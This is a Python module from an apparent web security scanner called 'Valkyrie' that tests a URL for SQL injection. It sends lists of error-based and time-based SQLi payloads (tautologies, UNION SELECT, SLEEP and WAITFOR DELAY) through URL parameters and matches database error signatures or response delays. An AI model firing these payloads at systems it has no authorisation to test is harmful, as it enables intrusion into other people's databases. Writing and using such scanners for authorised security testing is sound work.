#!/usr/bin/env python3
"""
Valkyrie Module: Advanced SQL Injection Scanner
Author: Sonia
Version: 2.0.0
Description: Multi-payload SQLi detection with error-based, boolean-based,
             and time-based blind injection testing. Async aiohttp compatible.
"""

import aiohttp
import asyncio
from urllib.parse import urlparse, urlunparse, parse_qsl, urlencode
from datetime import datetime

ERROR_BASED_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1 AND 1=2",
    "1 AND 1=1",
    "' AND SLEEP(0)--",
]

TIME_BASED_PAYLOADS = [
    "' AND SLEEP(4)--",
    "1; WAITFOR DELAY '0:0:4'--",
    "' OR SLEEP(4)--",
    "1' AND SLEEP(4) AND '1'='1",
]

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql server version",
    "supplied argument is not a valid mysql",
    "mariadb",
    "pg_query",
    "postgresql",
    "pg::syntaxerror",
    "microsoft sql server",
    "unclosed quotation mark",
    "incorrect syntax near",
    "mssql_query",
    "ora-00933",
    "ora-01756",
    "oracle error",
    "quoted string not properly terminated",
    "sqlite3",
    "sqlite_error",
    "sql error",
    "sql syntax",
    "syntax error",
    "database error",
    "warning: mysql",
    "division by zero",
    "invalid query",
    "db2 sql error",
]

COMMON_PARAMS = [
    'id', 'user_id', 'item', 'product', 'page', 'cat',
    'category', 'search', 'q', 'query', 'ref', 'token',
    'order', 'sort', 'name', 'username', 'email',
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Valkyrie-SQLi-Scanner/2.0",
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
}


def _build_sqli_urls(target_url: str, payload: str) -> list:
    parsed = urlparse(target_url)
    test_urls = []

    existing_params = parse_qsl(parsed.query)
    if existing_params:
        injected = [(k, payload) for k, v in existing_params]
        new_query = urlencode(injected)
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
        test_urls.append(test_url)

    for param in COMMON_PARAMS[:5]:
        new_query = urlencode([(param, payload)])
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
        test_urls.append(test_url)

    return test_urls


def _has_sql_error(response_body: str) -> tuple:
    body_lower = response_body.lower()
    for signature in SQL_ERROR_SIGNATURES:
        if signature in body_lower:
            return True, signature
    return False, None


async def _test_error_based(target_url: str, session: aiohttp.ClientSession) -> list:
    findings = []

    for payload in ERROR_BASED_PAYLOADS:
        test_urls = _build_sqli_urls(target_url, payload)

        for test_url in test_urls[:3]:
            try:
                async with session.get(
                    test_url,
                    headers=HEADERS,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False,
                    allow_redirects=True
                ) as response:
                    if response.status in (200, 500):
                        body = await response.text(errors='ignore')
                        found, matched_sig = _has_sql_error(body)

                        if found:
                            findings.append({
                                "type": "Error-Based SQLi",
                                "payload": payload,
                                "url": test_url,
                                "evidence": matched_sig,
                                "status_code": response.status
                            })
                            break

            except asyncio.TimeoutError:
                continue
            except Exception:
                continue

        await asyncio.sleep(0.3)

    return findings


async def _test_time_based(target_url: str, session: aiohttp.ClientSession) -> list:
    findings = []

    for payload in TIME_BASED_PAYLOADS:
        test_urls = _build_sqli_urls(target_url, payload)

        for test_url in test_urls[:2]:
            try:
                start_time = asyncio.get_event_loop().time()

                async with session.get(
                    test_url,
                    headers=HEADERS,
                    timeout=aiohttp.ClientTimeout(total=12),
                    ssl=False,
                    allow_redirects=True
                ) as response:
                    elapsed = asyncio.get_event_loop().time() - start_time

                    if elapsed >= 3.5 and response.status in (200, 500):
                        findings.append({
                            "type": "Time-Based Blind SQLi",
                            "payload": payload,
                            "url": test_url,
                            "evidence": f"Response delayed {elapsed:.2f}s (threshold: 3.5s)",
                            "status_code": response.status
                        })
                        break

            except asyncio.TimeoutError:
                findings.append({
                    "type": "Time-Based Blind SQLi (Timeout)",
                    "payload": payload,
                    "url": test_url,
                    "evidence": "Request timed out — possible sleep injection",
                    "status_code": "N/A"
                })
                break
            except Exception:
                continue

        await asyncio.sleep(0.5)

    return findings


async def run(target_url: str, session: aiohttp.ClientSession) -> dict:
    all_findings = []

    try:
        error_findings = await _test_error_based(target_url, session)
        all_findings.extend(error_findings)

        if not error_findings:
            time_findings = await _test_time_based(target_url, session)
            all_findings.extend(time_findings)

    except Exception as e:
        return {
            "status": "Error",
            "timestamp": datetime.utcnow().isoformat(),
            "summary": f"SQLi scanner error: {str(e)}"
        }

    if all_findings:
        details = []
        for f in all_findings:
            details.append(
                f"TYPE: {f['type']} | PAYLOAD: {f['payload']} "
                f"| EVIDENCE: {f['evidence']} | URL: {f['url']}"
            )

        return {
            "status": "Vulnerable / Alert",
            "timestamp": datetime.utcnow().isoformat(),
            "summary": (
                f"🚨 SQL INJECTION DETECTED — {len(all_findings)} finding(s)!\n" +
                "\n".join(details)
            )
        }

    return {
        "status": "Safe / Clean",
        "timestamp": datetime.utcnow().isoformat(),
        "summary": (
            f"No SQLi detected. Tested {len(ERROR_BASED_PAYLOADS)} error-based "
            f"+ {len(TIME_BASED_PAYLOADS)} time-based payloads."
        )
    }


def scan_vulnerabilities(url: str) -> str:
    async def _run():
        async with aiohttp.ClientSession() as session:
            result = await run(url, session)
            return result["summary"]
    return asyncio.run(_run())


if __name__ == "__main__":
    import sys

    async def _test():
        target = sys.argv[1] if len(sys.argv) > 1 else "http://testphp.vulnweb.com/listproducts.php?cat=1"
        print(f"\n[*] SQLi Testing: {target}\n")
        async with aiohttp.ClientSession() as session:
            result = await run(target, session)
            print(f"Status  : {result['status']}")
            print(f"Summary : {result['summary']}")

    asyncio.run(_test())
